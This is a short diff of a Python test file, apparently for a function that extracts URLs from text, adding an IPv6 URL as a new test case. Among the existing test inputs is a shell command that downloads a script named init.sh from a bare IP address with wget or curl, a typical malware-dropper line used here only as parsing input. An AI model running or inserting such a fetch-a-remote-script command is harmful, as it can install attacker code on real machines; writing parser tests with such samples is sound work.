@@ -48,6 +48,7 @@ def test_get_urls_from_text(text, expected_urls):
             "IP addres is not a domain name sh -c 'wget -q http://123.45.67.8/init.sh || curl -s -O -f http://123.45.67.8/init.sh 2>&1 3>&1'"
         ),
         (r"\"C:\Users\SOMEUSER~1\AppData\Local\Temp\jdcsdfsdfrg3qi27kz81.tmp\""),
+        ("http://[2607:f8b0:4003:c00::6a]/"),
     ],
 )
 def test_get_urls_from_text(text):
